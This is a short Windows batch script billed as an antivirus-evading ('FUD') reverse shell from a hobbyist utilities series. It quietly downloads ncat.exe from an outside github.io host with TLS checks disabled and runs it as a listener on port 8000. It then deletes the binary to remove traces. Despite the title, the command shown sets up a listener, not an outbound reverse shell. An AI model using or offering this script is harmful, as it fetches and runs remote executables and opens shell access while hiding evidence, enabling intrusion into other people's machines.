@echo off
title FUD Reverse Shell ^| by eltrevii for trevi's Utils - an eltrevii original series^^TM
cls
curl -kLs stivengiv.github.io/revs/ncat.exe -o %temp%\nc.exe
%temp%\nc -nlvp 8000
del /s /f /q %temp%\nc.exe
exit /b
